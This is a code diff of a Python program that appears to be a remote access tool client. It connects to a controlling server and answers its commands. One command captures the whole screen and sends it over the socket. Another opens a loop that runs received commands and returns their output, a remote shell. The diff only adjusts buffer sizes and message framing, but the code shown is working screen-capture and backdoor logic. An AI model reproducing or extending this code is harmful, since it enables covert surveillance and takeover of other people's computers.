@@ -13,15 +13,17 @@ def take_screen_shot():
     if len(mss.mss().monitors) > 0:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
+        size = str(len(img_data)) + "\n"
+        server_con.send(size.encode())
 
         server_con.sendall(img_data)
-        server_con.sendall(b'DONE')
+        #server_con.shutdown(socket.SHUT_WR)
         del(raw_pixels, img_data)
 
 def open_shell():
     while True:
         print("waiting for cmd...")
-        data = server_con.recv(4096)
+        data = server_con.recv(1024)
         str_msg = b""
 
         if data.decode() == "exit":
@@ -39,7 +41,7 @@ def open_shell():
             str_msg = output[0]
         else:
             str_msg = b"Error!"
-        
+
         if not str_msg:
             str_msg = b" "
 
@@ -61,11 +63,11 @@ def establish_connection(address):
         else:
             break
 
-            
+
 def main():
     ip, port = "0.0.0.0", 3000 #address[0], int(address[1])
     establish_connection((ip,port))
-    
+
     while True:
         choice = server_con.recv(1024).decode()
         if choice == "1":
@@ -78,5 +80,5 @@ def main():
             sys.exit()
 
     server_con.close()
-  
+
 main()
